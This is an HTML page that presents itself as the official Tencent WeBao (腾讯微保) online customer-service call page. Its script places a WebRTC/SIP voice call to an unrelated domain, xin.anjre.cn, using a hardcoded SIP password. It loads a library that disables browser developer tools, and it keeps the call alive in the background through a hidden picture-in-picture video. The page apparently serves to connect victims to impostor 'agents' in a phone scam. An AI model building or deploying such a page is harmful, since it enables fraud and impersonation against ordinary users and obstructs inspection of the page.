<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>腾讯微保在线客服</title>
  <style>
    :root {
      --main-blue: #2685fa;
      --main-blue-dark: #1756a9;
      --main-blue-light: #eaf3fe;
      --main-gray: #f5f7fa;
      --main-font: 'PingFang SC', 'Microsoft YaHei', Arial, sans-serif;
      --border-radius: 14px;
    }
    body {
      font-family: var(--main-font);
      background: linear-gradient(135deg, var(--main-blue-light) 0%, #fff 100%);
      min-height: 100vh;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
    }
    .logo-box {
      margin-top: 36px;
      margin-bottom: 18px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .logo-box img {
      height: 60px;
      margin-bottom: 10px;
    }
    .main-content {
      background: #fff;
      box-shadow: 0 4px 24px 0 rgba(38,133,250,0.10);
      border-radius: var(--border-radius);
      padding: 36px 32px 32px 32px;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-width: 340px;
      max-width: 96vw;
      margin-bottom: 28px;
    }
    h1 {
      font-size: 28px;
      color: var(--main-blue-dark);
      margin: 0 0 26px 0;
      letter-spacing: 2px;
      font-weight: 700;
    }
    #callButton, #hangupButton, #pipButton {
      padding: 16px 44px;
      font-size: 20px;
      margin: 12px 10px;
      border: none;
      border-radius: 28px;
      cursor: pointer;
      font-weight: 600;
      box-shadow: 0 2px 6px rgba(38,133,250,0.08);
      transition: background 0.2s, box-shadow 0.2s;
      outline: none;
    }
    #callButton {
      background: linear-gradient(90deg, var(--main-blue) 0%, #47b4ff 100%);
      color: #fff;
    }
    #callButton:disabled {
      background: #a5c8f7;
      color: #fff;
      cursor: not-allowed;
    }
    #hangupButton {
      background: linear-gradient(90deg, #ee4747 0%, #ff8888 100%);
      color: #fff;
    }
    #hangupButton:disabled {
      background: #ffcccc;
      color: #fff;
      cursor: not-allowed;
    }
    #pipButton {
      background: linear-gradient(90deg, #4caf50 0%, #81c784 100%);
      color: #fff;
    }
    #pipButton:disabled {
      background: #c8e6c9;
      color: #fff;
      cursor: not-allowed;
    }
    #callStatus {
      font-size: 17px;
      margin-top: 16px;
      color: var(--main-blue-dark);
      letter-spacing: 1px;
    }
    .footer {
      margin-top: 30px;
      font-size: 16px;
      color: #666;
      text-align: center;
      line-height: 1.8;
      width: 100%;
      max-width: 460px;
      padding: 0 14px 40px 14px;
    }
    .footer strong {
      color: var(--main-blue-dark);
    }
    @media (max-width: 500px) {
      .main-content {
        padding: 22px 6vw 18px 6vw;
        min-width: unset;
      }
      h1 {
        font-size: 22px;
      }
      #callButton, #hangupButton, #pipButton {
        width: 92vw;
        min-width: 0;
        font-size: 17px;
        margin: 10px 0;
      }
    }
  </style>
</head>
<body>

  <div class="logo-box">
    <img src="https://static.weibocdn.com/assets/img/brand/webao_logo_blue.svg" alt="腾讯微保LOGO" onerror="this.style.display='none'">
  </div>

  <div class="main-content">
    <h1>腾讯微保在线客服</h1>
    <button id="callButton" onclick="makeCall()">📞 呼叫客服</button>
    <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
    <button id="pipButton" disabled>开启画中画（保持后台通话）</button>
    <div id="callStatus">未呼叫</div>
    <audio id="audioRemote" autoplay></audio>
  </div>

  <div class="footer">
    <strong>温馨提示：</strong><br>
    您正在使用腾讯微保官方在线客服。点击“呼叫客服”按钮即可与专业客服通话。<br>
    如需帮助，请随时点击“挂断”结束当前通话。微保将竭诚为您服务。<br>
    客服服务时间：9:00-21:00（节假日无休）<br>
    <span style="color:#a3a3a3;font-size:13px;display:block;margin-top:8px;">© 2025 腾讯微保 版权所有</span>
  </div>

  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
  <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const socket = new JsSIP.WebSocketInterface('wss://xin.anjre.cn:8089/ws');

      const configuration = {
        sockets: [socket],
        uri: 'sip:1002020@xin.anjre.cn',
        password: 'Aa6363463@',
        display_name: '腾讯微保网页客户',
        session_timers: false,
        register: true
      };

      const ua = new JsSIP.UA(configuration);
      let session = null;
      let isCalling = false;

      ua.on('connected', () => console.log('已连接到 SIP WebSocket'));
      ua.on('registered', () => console.log('✅ 注册成功'));
      ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
      ua.on('disconnected', () => console.log('❗️ WebSocket 断开'));
      ua.start();

      const callButton = document.getElementById('callButton');
      const hangupButton = document.getElementById('hangupButton');
      const pipButton = document.getElementById('pipButton');
      const statusDisplay = document.getElementById('callStatus');
      const remoteAudio = document.getElementById('audioRemote');

      function updateStatus(text) {
        statusDisplay.textContent = text;
      }

      // 创建一个 1x1 隐藏canvas，生成空白视频流给video用
      const canvas = document.createElement('canvas');
      canvas.width = 1;
      canvas.height = 1;
      const videoStream = canvas.captureStream(1);

      const videoElement = document.createElement('video');
      videoElement.style.position = 'fixed';
      videoElement.style.width = '1px';
      videoElement.style.height = '1px';
      videoElement.style.bottom = '0';
      videoElement.style.right = '0';
      videoElement.style.opacity = '0';
      videoElement.muted = true;
      videoElement.srcObject = videoStream;
      document.body.appendChild(videoElement);
      videoElement.play();

      pipButton.addEventListener('click', async () => {
        try {
          if (videoElement !== document.pictureInPictureElement) {
            await videoElement.requestPictureInPicture();
          } else {
            await document.exitPictureInPicture();
          }
        } catch (err) {
          console.error('画中画请求失败:', err);
          alert('浏览器不支持画中画或请求失败');
        }
      });

      window.makeCall = function () {
        if (isCalling) return;
        isCalling = true;
        callButton.disabled = true;
        hangupButton.disabled = false;
        pipButton.disabled = true; // 通话中先禁用，等流加载成功再启用
        updateStatus("正在呼叫客服，请稍候...");

        session = ua.call('sip:999999@xin.anjre.cn', {
          mediaConstraints: { audio: true, video: false },
          rtcOfferConstraints: {
            offerToReceiveAudio: 1,
            offerToReceiveVideo: 0
          }
        });

        session.connection.addEventListener('addstream', function (e) {
          remoteAudio.srcObject = e.stream;
          remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
          pipButton.disabled = false; // 流来了，启用画中画按钮
        });

        session.on('progress', () => updateStatus("正在为您接通客服..."));
        session.on('accepted', () => updateStatus("客服通话中"));
        session.on('ended', () => {
          updateStatus("通话已结束，感谢您的使用！");
          resetUI();
        });
        session.on('failed', (e) => {
          updateStatus("呼叫失败，请稍后重试");
          console.error('呼叫失败:', e);
          resetUI();
        });
      };

      window.hangupCall = function () {
        if (session) {
          session.terminate();
        }
      };

      function resetUI() {
        isCalling = false;
        callButton.disabled = false;
        hangupButton.disabled = true;
        pipButton.disabled = true;
        session = null;
      }
    });
  </script>
</body>
</html>
